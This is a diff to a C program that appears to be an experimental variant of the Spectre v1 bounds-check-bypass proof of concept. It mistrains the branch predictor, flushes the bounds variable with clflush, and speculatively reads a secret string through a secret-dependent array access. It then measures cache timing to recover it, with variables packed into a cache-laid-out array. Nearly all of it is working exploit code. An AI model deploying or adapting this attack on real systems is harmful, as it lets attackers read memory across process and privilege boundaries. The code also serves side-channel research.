@@ -8,8 +8,8 @@
 #include <x86intrin.h> /* for rdtscp and clflush */
 #endif
 
-#define DISTANCE 256 // 64bytes * 4SETs
-#define INDICES 16 // 16 * 8WAY
+#define DISTANCE 64 // 64bytes * 4SETs
+#define INDICES 64 // 16 * 8WAY
 /* Intel 32KB L1 cache consists of 8-way 64 sets, each has 64 bytes line */
 #define WAY 8
 #define SET 64
@@ -62,11 +62,11 @@ uint8_t array2[WAY * SET * LINE] = {
 /*015*/	  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0',
 /*016*/	  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0',
 /*017*/	  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0',
-
+//	//		0	1	2	3	4	5	6	7	8	9	a	b	c	d 	e	f
 //*010*/	addr-	-	-	-	-	-	-	i	-	-	-	j	-	-	-
 //*011*/	junk-	-	-	time1	-	-	time2	-	-	z	-	-	-	
-//*012*/	array1	-	-	-	-	-	-
-//*013*/	  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0',
+//*012*/	array1	-	-	-	-	-	-   array3	-	-	-	-	-	-
+//*013*/	training_x	-	-	-	-	-	x	-	-	-	-	-	-	-
 //*014*/	  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0',
 //*015*/	  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0',
 //*016*/	  '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0',
@@ -128,9 +128,9 @@ uint8_t array2[WAY * SET * LINE] = {
 };
 
 
-uint8_t unused3[DISTANCE*2] = {0,};
+uint8_t unused3[DISTANCE*3] = {0,};
 
-uint8_t temp = 0;
+//uint8_t temp = 0;
 unsigned int array3_size = 16;
 uint8_t array3[160] = {
 	1,
@@ -152,15 +152,15 @@ uint8_t array3[160] = {
 };
 
 //char * secret = "The Magic Words are Squeamish Ossifrage.";
-char * secret = "he Magic Words are Squeamish Ossifrage.";
+char * secret = "The Magic Words are Squeamish Ossifrage.";
 
 //uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
-void victim_function(size_t x) {
+/*void victim_function(size_t x) {
 	if (x < array3_size) {
 		temp &= array1[array3[x] * DISTANCE];
 	}
-}
+}*/
 
 /********************************************************************
 Analysis code
@@ -171,12 +171,17 @@ Analysis code
 
 int main (int argc, const char ** argv) {
 	//volatile uint8_t *addr;
-	//uint8_t j = 0;
-	size_t training_x, x;
+	//int j = 0;
+	//size_t training_x, x;
 	int time2 = 0;
 	
 	((uint8_t**)array2)[0x14] = array1;
+	((uint8_t**)array2)[0x15] = array3;
 	//printf("%p,%p\n",array1,((uint8_t**)array2)[0x14]);
+
+	for (((int*)array2)[0x23]=0;((int*)array2)[0x23]< sizeof(array1);((int*)array2)[0x23]++){
+		((uint8_t**)array2)[0x14][((int*)array2)[0x23]] = 1;
+	}
 
 	//printf("%s",&array2[0x29]);// flush\n
 	for(array2[0x88] = 0 ; array2[0x88] < WAY ; array2[0x88]++){
@@ -206,28 +211,34 @@ int main (int argc, const char ** argv) {
 		//printf("set%02d time is %d\n",array1[18],array1[17]);
 	}
 
-	// eavesdrop
+	/////////////////////////
+	// eavesdrop!!!!!!!!!!!//
+	/////////////////////////
+
 	//((int*)array2)[0x24] &= *(uint8_t*)(((unsigned long)array1 & ~0xFFF) + (0x3 * DISTANCE));
-   	training_x = 99 % array3_size;
+	//training_x = 99 % array3_size;
+   	*((size_t*)(array2+0xD0)) = 1 % array3_size;
     for (((int*)array2)[0x23] = 29; ((int*)array2)[0x23] >= 0; ((int*)array2)[0x23]--) {
     	_mm_clflush( & array3_size);
     	for (array2[0x9C] = 0; array2[0x9C] < 100; array2[0x9C]++) {} //* Delay (can also mfence) /
 
     	//*Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0/
     	//* Avoid jumps in case those tip off the branch predictor /
-    	x = ((((int*)array2)[0x23] % 6) - 1) & ~0xFFFF; //* Set x=FFF.FF0000 if j%6==0, else x=0 /
-    	x = (x | (x >> 16)); //* Set x=-1 if j&6=0, else x=0 /
-    	x = training_x ^ (x & ((size_t)(secret-(char*)array3) ^ training_x));
+		// x = array2[0xD8] size_t 8 bytes
+    	*(size_t*)(array2+0xD8) = ((((int*)array2)[0x23] % 6) - 1) & ~0xFFFF; //* Set x=FFF.FF0000 if j%6==0, else x=0 /
+    	*(size_t*)(array2+0xD8) = (*(size_t*)(array2+0xD8) | (*(size_t*)(array2+0xD8) >> 16)); //* Set x=-1 if j&6=0, else x=0 /
+    	*(size_t*)(array2+0xD8) = *(size_t*)(array2+0xD0) ^ (*(size_t*)(array2+0xD8) & ((size_t)(secret-(char*)array3) ^ *((size_t*)(array2+0xD0))));
 
     	//* Call the victim! /
     	//victim_function(x);
-		if (x < array3_size) {
-			((int*)array2)[0x24] &= *(uint8_t*)(((unsigned long)((uint8_t**)array2)[0x14] & ~0xFFF) + (0x1 * DISTANCE));
-			//temp += 1;
+		if (*(size_t*)(array2+0xD8) < array3_size) {
+			((int*)array2)[0x24] &= *(uint8_t*)(((unsigned long)((uint8_t**)array2)[0x14] & ~0xFFF) + (((uint8_t**)array2)[0x15][*(size_t*)(array2+0xD8)] * DISTANCE));
 			//temp &= array1[array3[x] * DISTANCE];
 			//temp &= array1[8 * DISTANCE];
 		}
-    }
+
+		
+	}
 
 
 	//printf("%s",&array2[0x37]);// probe\n
@@ -278,5 +289,9 @@ int main (int argc, const char ** argv) {
 		//printf("set%02d time is %d\n",array1[18],array1[17]);
 	}
 
-
+	for(int len =0; len < 40 ; len ++){
+		printf("%c,%d",secret[len],secret[len]%DISTANCE);
+		printf("\n");
+	}
+	printf("%p,%p,%p\n",&time2,&array3_size,secret);
 }
